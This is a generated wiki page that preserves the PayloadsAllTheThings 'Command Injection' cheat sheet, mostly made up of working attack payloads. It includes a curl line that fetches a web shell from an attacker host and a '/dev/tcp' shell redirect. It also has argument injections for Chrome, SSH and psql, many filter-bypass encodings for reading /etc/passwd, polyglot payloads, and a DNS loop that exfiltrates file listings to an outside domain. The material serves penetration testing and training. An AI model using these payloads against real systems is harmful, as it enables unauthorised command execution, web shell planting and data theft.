---
parsed_by: focuslocust
source: payloadsallthethings
type: generated
---
# Command Injection

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `payloadsallthethings` |
| Type | `payload-topic` |
| Record ID | `patt-command-injection-readme` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/Command Injection/README.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Command Injection](../../topics/command-injection/command-injection.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | patt-command-injection-readme |
| name | Command Injection |
| type | payload-topic |
| source | payloadsallthethings |
| url | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md |

## Preserved Source Material

````yaml
_body: "# Command Injection\n\n> Command injection is a security vulnerability that allows an attacker to execute arbitrary\
  \ commands inside a vulnerable application.\n\n## Summary\n\n* [Tools](#tools)\n* [Methodology](#methodology)\n    * [Basic\
  \ Commands](#basic-commands)\n    * [Chaining Commands](#chaining-commands)\n    * [Argument Injection](#argument-injection)\n\
  \    * [Inside A Command](#inside-a-command)\n* [Filter Bypasses](#filter-bypasses)\n    * [Bypass Without Space](#bypass-without-space)\n\
  \    * [Bypass With A Line Return](#bypass-with-a-line-return)\n    * [Bypass With Backslash Newline](#bypass-with-backslash-newline)\n\
  \    * [Bypass With Tilde Expansion](#bypass-with-tilde-expansion)\n    * [Bypass With Brace Expansion](#bypass-with-brace-expansion)\n\
  \    * [Bypass Characters Filter](#bypass-characters-filter)\n    * [Bypass Characters Filter Via Hex Encoding](#bypass-characters-filter-via-hex-encoding)\n\
  \    * [Bypass With Single Quote](#bypass-with-single-quote)\n    * [Bypass With Double Quote](#bypass-with-double-quote)\n\
  \    * [Bypass With Backticks](#bypass-with-backticks)\n    * [Bypass With Backslash And Slash](#bypass-with-backslash-and-slash)\n\
  \    * [Bypass With $@](#bypass-with-)\n    * [Bypass With $()](#bypass-with--1)\n    * [Bypass With Variable Expansion](#bypass-with-variable-expansion)\n\
  \    * [Bypass With Wildcards](#bypass-with-wildcards)\n    * [Bypass With Random Case](#bypass-with-random-case)\n* [Data\
  \ Exfiltration](#data-exfiltration)\n    * [Time Based Data Exfiltration](#time-based-data-exfiltration)\n    * [Dns Based\
  \ Data Exfiltration](#dns-based-data-exfiltration)\n* [Polyglot Command Injection](#polyglot-command-injection)\n* [Tricks](#tricks)\n\
  \    * [Backgrounding Long Running Commands](#backgrounding-long-running-commands)\n    * [Remove Arguments After The Injection](#remove-arguments-after-the-injection)\n\
  * [Labs](#labs)\n    * [Challenge](#challenge)\n* [References](#references)\n\n## Tools\n\n* [commixproject/commix](https://github.com/commixproject/commix)\
  \ - Automated All-in-One OS command injection and exploitation tool\n* [projectdiscovery/interactsh](https://github.com/projectdiscovery/interactsh)\
  \ - An OOB interaction gathering server and client library\n\n## Methodology\n\nCommand injection, also known as shell injection,\
  \ is a type of attack in which the attacker can execute arbitrary commands on the host operating system via a vulnerable\
  \ application. This vulnerability can exist when an application passes unsafe user-supplied data (forms, cookies, HTTP headers,\
  \ etc.) to a system shell. In this context, the system shell is a command-line interface that processes commands to be executed,\
  \ typically on a Unix or Linux system.\n\nThe danger of command injection is that it can allow an attacker to execute any\
  \ command on the system, potentially leading to full system compromise.\n\n**Example of Command Injection with PHP**:\n\
  Suppose you have a PHP script that takes a user input to ping a specified IP address or domain:\n\n```php\n<?php\n    $ip\
  \ = $_GET['ip'];\n    system(\"ping -c 4 \" . $ip);\n?>\n```\n\nIn the above code, the PHP script uses the `system()` function\
  \ to execute the `ping` command with the IP address or domain provided by the user through the `ip` GET parameter.\n\nIf\
  \ an attacker provides input like `8.8.8.8; cat /etc/passwd`, the actual command that gets executed would be: `ping -c 4\
  \ 8.8.8.8; cat /etc/passwd`.\n\nThis means the system would first `ping 8.8.8.8` and then execute the `cat /etc/passwd`\
  \ command, which would display the contents of the `/etc/passwd` file, potentially revealing sensitive information.\n\n\
  ### Basic Commands\n\nExecute the command and voila :p\n\n```powershell\ncat /etc/passwd\nroot:x:0:0:root:/root:/bin/bash\n\
  daemon:x:1:1:daemon:/usr/sbin:/bin/sh\nbin:x:2:2:bin:/bin:/bin/sh\nsys:x:3:3:sys:/dev:/bin/sh\n...\n```\n\n### Chaining\
  \ Commands\n\nIn many command-line interfaces, especially Unix-like systems, there are several characters that can be used\
  \ to chain or manipulate commands.\n\n* `;` (Semicolon): Allows you to execute multiple commands sequentially.\n* `&&` (AND):\
  \ Execute the second command only if the first command succeeds (returns a zero exit status).\n* `||` (OR): Execute the\
  \ second command only if the first command fails (returns a non-zero exit status).\n* `&` (Background): Execute the command\
  \ in the background, allowing the user to continue using the shell.\n* `|` (Pipe):  Takes the output of the first command\
  \ and uses it as the input for the second command.\n\n```powershell\ncommand1; command2   # Execute command1 and then command2\n\
  command1 && command2 # Execute command2 only if command1 succeeds\ncommand1 || command2 # Execute command2 only if command1\
  \ fails\ncommand1 & command2  # Execute command1 in the background\ncommand1 | command2  # Pipe the output of command1 into\
  \ command2\n```\n\n### Argument Injection\n\nGain a command execution when you can only append arguments to an existing\
  \ command.\nUse this website [Argument Injection Vectors - Sonar](https://sonarsource.github.io/argument-injection-vectors/)\
  \ to find the argument to inject to gain command execution.\n\n* Chrome\n\n    ```ps1\n    chrome '--gpu-launcher=\"id>/tmp/foo\"\
  '\n    ```\n\n* SSH\n\n    ```ps1\n    ssh '-oProxyCommand=\"touch /tmp/foo\"' foo@foo\n    ```\n\n* psql\n\n    ```ps1\n\
  \    psql -o'|id>/tmp/foo'\n    ```\n\nArgument injection can be abused using the [worstfit](https://blog.orange.tw/posts/2025-01-worstfit-unveiling-hidden-transformers-in-windows-ansi/)\
  \ technique.\n\nIn the following example, the payload `＂ --use-askpass=calc ＂` is using **fullwidth double quotes** (U+FF02)\
  \ instead of the **regular double quotes** (U+0022)\n\n```php\n$url = \"https://example.tld/\" . $_GET['path'] . \".txt\"\
  ;\nsystem(\"wget.exe -q \" . escapeshellarg($url));\n```\n\nSometimes, direct command execution from the injection might\
  \ not be possible, but you may be able to redirect the flow into a specific file, enabling you to deploy a web shell.\n\n\
  * curl\n\n    ```ps1\n    # -o, --output <file>        Write to file instead of stdout\n    curl http://[ATTACKER.DOMAIN.TLD]/\
  \ -o webshell.php\n    ```\n\n### Inside A Command\n\n* Command injection using backticks.\n\n  ```bash\n  original_cmd_by_server\
  \ `cat /etc/passwd`\n  ```\n\n* Command injection using substitution\n\n  ```bash\n  original_cmd_by_server $(cat /etc/passwd)\n\
  \  ```\n\n## Filter Bypasses\n\n### Bypass Without Space\n\n* `$IFS` is a special shell variable called the Internal Field\
  \ Separator. By default, in many shells, it contains whitespace characters (space, tab, newline). When used in a command,\
  \ the shell will interpret `$IFS` as a space. `$IFS` does not directly work as a separator in commands like `ls`, `wget`;\
  \ use `${IFS}` instead.\n\n  ```powershell\n  cat${IFS}/etc/passwd\n  ls${IFS}-la\n  ```\n\n* In some shells, brace expansion\
  \ generates arbitrary strings. When executed, the shell will treat the items inside the braces as separate commands or arguments.\n\
  \n  ```powershell\n  {cat,/etc/passwd}\n  ```\n\n* Input redirection. The < character tells the shell to read the contents\
  \ of the file specified.\n\n  ```powershell\n  cat</etc/passwd\n  sh</dev/tcp/127.0.0.1/4242\n  ```\n\n* ANSI-C Quoting\n\
  \n  ```powershell\n  X=$'uname\\x20-a'&&$X\n  ```\n\n* The tab character can sometimes be used as an alternative to spaces.\
  \ In ASCII, the tab character is represented by the hexadecimal value `09`.\n\n  ```powershell\n  ;ls%09-al%09/home\n  ```\n\
  \n* In Windows, `%VARIABLE:~start,length%` is a syntax used for substring operations on environment variables.\n\n  ```powershell\n\
  \  ping%CommonProgramFiles:~10,-18%127.0.0.1\n  ping%PROGRAMFILES:~10,-5%127.0.0.1\n  ```\n\n### Bypass With A Line Return\n\
  \nCommands can also be run in sequence with newlines\n\n```bash\noriginal_cmd_by_server\nls\n```\n\n### Bypass With Backslash\
  \ Newline\n\n* Commands can be broken into parts by using backslash followed by a newline\n\n  ```powershell\n  $ cat /et\\\
  \n  c/pa\\\n  sswd\n  ```\n\n* URL encoded form would look like this:\n\n  ```powershell\n  cat%20/et%5C%0Ac/pa%5C%0Asswd\n\
  \  ```\n\n### Bypass With Tilde Expansion\n\n```powershell\necho ~+\necho ~-\n```\n\n### Bypass With Brace Expansion\n\n\
  ```powershell\n{,ip,a}\n{,ifconfig}\n{,ifconfig,eth0}\n{l,-lh}s\n{,echo,#test}\n{,$\"whoami\",}\n{,/?s?/?i?/c?t,/e??/p??s??,}\n\
  ```\n\n### Bypass Characters Filter\n\nCommands execution without backslash and slash - linux bash\n\n```powershell\nswissky@crashlab:~$\
  \ echo ${HOME:0:1}\n/\n\nswissky@crashlab:~$ cat ${HOME:0:1}etc${HOME:0:1}passwd\nroot:x:0:0:root:/root:/bin/bash\n\nswissky@crashlab:~$\
  \ echo . | tr '!-0' '\"-1'\n/\n\nswissky@crashlab:~$ tr '!-0' '\"-1' <<< .\n/\n\nswissky@crashlab:~$ cat $(echo . | tr '!-0'\
  \ '\"-1')etc$(echo . | tr '!-0' '\"-1')passwd\nroot:x:0:0:root:/root:/bin/bash\n```\n\n### Bypass Characters Filter Via\
  \ Hex Encoding\n\n```powershell\nswissky@crashlab:~$ echo -e \"\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64\"\
  \n/etc/passwd\n\nswissky@crashlab:~$ cat `echo -e \"\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64\"`\nroot:x:0:0:root:/root:/bin/bash\n\
  \nswissky@crashlab:~$ abc=$'\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64';cat $abc\nroot:x:0:0:root:/root:/bin/bash\n\
  \nswissky@crashlab:~$ `echo $'cat\\x20\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64'`\nroot:x:0:0:root:/root:/bin/bash\n\
  \nswissky@crashlab:~$ xxd -r -p <<< 2f6574632f706173737764\n/etc/passwd\n\nswissky@crashlab:~$ cat `xxd -r -p <<< 2f6574632f706173737764`\n\
  root:x:0:0:root:/root:/bin/bash\n\nswissky@crashlab:~$ xxd -r -ps <(echo 2f6574632f706173737764)\n/etc/passwd\n\nswissky@crashlab:~$\
  \ cat `xxd -r -ps <(echo 2f6574632f706173737764)`\nroot:x:0:0:root:/root:/bin/bash\n```\n\n### Bypass With Single Quote\n\
  \n```powershell\nw'h'o'am'i\nwh''oami\n'w'hoami\n```\n\n### Bypass With Double Quote\n\n```powershell\nw\"h\"o\"am\"i\n\
  wh\"\"oami\n\"wh\"oami\n```\n\n### Bypass With Backticks\n\n```powershell\nwh``oami\n```\n\n### Bypass With Backslash and\
  \ Slash\n\n```powershell\nw\\ho\\am\\i\n/\\b\\i\\n/////s\\h\n```\n\n### Bypass With $@\n\n`$0`: Refers to the name of the\
  \ script if it's being run as a script. If you're in an interactive shell session, `$0` will typically give the name of\
  \ the shell.\n\n```powershell\nwho$@ami\necho whoami|$0\n```\n\n### Bypass With $()\n\n```powershell\nwho$()ami\nwho$(echo\
  \ am)i\nwho`echo am`i\n```\n\n### Bypass With Variable Expansion\n\n```powershell\n/???/??t /???/p??s??\n\ntest=/ehhh/hmtc/pahhh/hmsswd\n\
  cat ${test//hhh\\/hm/}\ncat ${test//hh??hm/}\n```\n\n### Bypass With Wildcards\n\n```powershell\npowershell C:\\*\\*2\\\
  n??e*d.*? # notepad\n@^p^o^w^e^r^shell c:\\*\\*32\\c*?c.e?e # calc\n```\n\n### Bypass With Random Case\n\nWindows does not\
  \ distinguish between uppercase and lowercase letters when interpreting commands or file paths. For example, `DIR`, `dir`,\
  \ or `DiR` will all execute the same `dir` command.\n\n```powershell\nwHoAmi\n```\n\n## Data Exfiltration\n\n### Time Based\
  \ Data Exfiltration\n\nExtracting data char by char and detect the correct value based on the delay.\n\n* Correct value:\
  \ wait 5 seconds\n\n  ```powershell\n  swissky@crashlab:~$ time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi\n  real\
  \    0m5.007s\n  user    0m0.000s\n  sys 0m0.000s\n  ```\n\n* Incorrect value: no delay\n\n  ```powershell\n  swissky@crashlab:~$\
  \ time if [ $(whoami|cut -c 1) == a ]; then sleep 5; fi\n  real    0m0.002s\n  user    0m0.000s\n  sys 0m0.000s\n  ```\n\
  \n### Dns Based Data Exfiltration\n\nBased on the tool from [HoLyVieR/dnsbin](https://github.com/HoLyVieR/dnsbin), also\
  \ hosted at [dnsbin.zhack.ca](http://dnsbin.zhack.ca/)\n\n1. Go to [dnsbin.zhack.ca](http://dnsbin.zhack.ca)\n2. Execute\
  \ a simple 'ls'\n\n  ```powershell\n  for i in $(ls /) ; do host \"$i.3a43c7e4e57a8d0e2057.d.zhack.ca\"; done\n  ```\n\n\
  Online tools to check for DNS based data exfiltration:\n\n* [dnsbin.zhack.ca](http://dnsbin.zhack.ca)\n* [app.interactsh.com](https://app.interactsh.com)\n\
  * [portswigger.net](https://portswigger.net/burp/documentation/collaborator)\n\n## Polyglot Command Injection\n\nA polyglot\
  \ is a piece of code that is valid and executable in multiple programming languages or environments simultaneously. When\
  \ we talk about \"polyglot command injection,\" we're referring to an injection payload that can be executed in multiple\
  \ contexts or environments.\n\n* Example 1:\n\n  ```powershell\n  Payload: 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}\"\
  ;sleep${IFS}9;#${IFS}\n\n  # Context inside commands with single and double quote:\n  echo 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}\"\
  ;sleep${IFS}9;#${IFS}\n  echo '1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}\";sleep${IFS}9;#${IFS}\n  echo \"1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}\"\
  ;sleep${IFS}9;#${IFS}\n  ```\n\n* Example 2:\n\n  ```powershell\n  Payload: /*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep\
  \ 5)`sleep 5` #*/-sleep(5)||'\"||sleep(5)||\"/*`*/\n\n  # Context inside commands with single and double quote:\n  echo\
  \ 1/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'\"||sleep(5)||\"/*`*/\n  echo \"YOURCMD/*$(sleep\
  \ 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'\"||sleep(5)||\"/*`*/\"\n  echo 'YOURCMD/*$(sleep 5)`sleep\
  \ 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'\"||sleep(5)||\"/*`*/'\n  ```\n\n## Tricks\n\n### Backgrounding Long\
  \ Running Commands\n\nIn some instances, you might have a long running command that gets killed by the process injecting\
  \ it timing out.\nUsing `nohup`, you can keep the process running after the parent process exits.\n\n```bash\nnohup sleep\
  \ 120 > /dev/null &\n```\n\n### Remove Arguments After The Injection\n\nIn Unix-like command-line interfaces, the `--` symbol\
  \ is used to signify the end of command options. After `--`, all arguments are treated as filenames and arguments, and not\
  \ as options.\n\n## Labs\n\n* [PortSwigger - OS command injection, simple case](https://portswigger.net/web-security/os-command-injection/lab-simple)\n\
  * [PortSwigger - Blind OS command injection with time delays](https://portswigger.net/web-security/os-command-injection/lab-blind-time-delays)\n\
  * [PortSwigger - Blind OS command injection with output redirection](https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection)\n\
  * [PortSwigger - Blind OS command injection with out-of-band interaction](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band)\n\
  * [PortSwigger - Blind OS command injection with out-of-band data exfiltration](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration)\n\
  * [Root Me - PHP - Command injection](https://www.root-me.org/en/Challenges/Web-Server/PHP-Command-injection)\n* [Root Me\
  \ - Command injection - Filter bypass](https://www.root-me.org/en/Challenges/Web-Server/Command-injection-Filter-bypass)\n\
  * [Root Me - PHP - assert()](https://www.root-me.org/en/Challenges/Web-Server/PHP-assert)\n* [Root Me - PHP - preg_replace()](https://www.root-me.org/en/Challenges/Web-Server/PHP-preg_replace)\n\
  \n### Challenge\n\nChallenge based on the previous tricks, what does the following command do:\n\n```powershell\ng=\"/e\"\
  \\h\"hh\"/hm\"t\"c/\\i\"sh\"hh/hmsu\\e;tac$@<${g//hh??hm/}\n```\n\n**NOTE**: The command is safe to run, but you should\
  \ not trust me.\n\n## References\n\n* [Argument Injection and Getting Past Shellwords.escape - Etienne Stalmans - November\
  \ 24, 2019](https://web.archive.org/web/20250306133700/https://staaldraad.github.io/post/2019-11-24-argument-injection/)\n\
  * [Argument Injection Vectors - SonarSource - February 21, 2023](https://web.archive.org/web/20251211212046/https://sonarsource.github.io/argument-injection-vectors/)\n\
  * [Back to the Future: Unix Wildcards Gone Wild - Leon Juranic - June 25, 2014](https://web.archive.org/web/20140714140437/http://www.exploit-db.com/papers/33930)\n\
  * [Bash Obfuscation by String Manipulation - Malwrologist, @DissectMalware - August 4, 2018](https://web.archive.org/web/20241202133053/https://twitter.com/DissectMalware/status/1025604382644232192)\n\
  * [Bug Bounty Survey - Windows RCE Spaceless - Bug Bounties Survey - May 4, 2017](https://web.archive.org/web/20180808181450/https://twitter.com/bugbsurveys/status/860102244171227136)\n\
  * [No PHP, No Spaces, No $, No {}, Bash Only - Sven Morgenroth - August 9, 2017](https://web.archive.org/web/20220428000241/https://twitter.com/asdizzle_/status/895244943526170628)\n\
  * [OS Command Injection - PortSwigger - March 30, 2019](https://web.archive.org/web/20190330193912/https://portswigger.net/web-security/os-command-injection)\n\
  * [SECURITY CAFÉ - Exploiting Timed-Based RCE - Pobereznicenco Dan - February 28, 2017](https://web.archive.org/web/20250108174818/https://securitycafe.ro/2017/02/28/time-based-data-exfiltration/)\n\
  * [TL;DR: How to Exploit/Bypass/Use PHP escapeshellarg/escapeshellcmd Functions - Kacper Szurek - April 25, 2018](https://github.com/kacperszurek/exploits/blob/master/GitList/exploit-bypass-php-escapeshellarg-escapeshellcmd.md)\n\
  * [WorstFit: Unveiling Hidden Transformers in Windows ANSI! - Orange Tsai - January 10, 2025](https://web.archive.org/web/20250109163006/https://blog.orange.tw/posts/2025-01-worstfit-unveiling-hidden-transformers-in-windows-ansi/)"
_relative_path: Command Injection/README.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/Command Injection/README.md
````
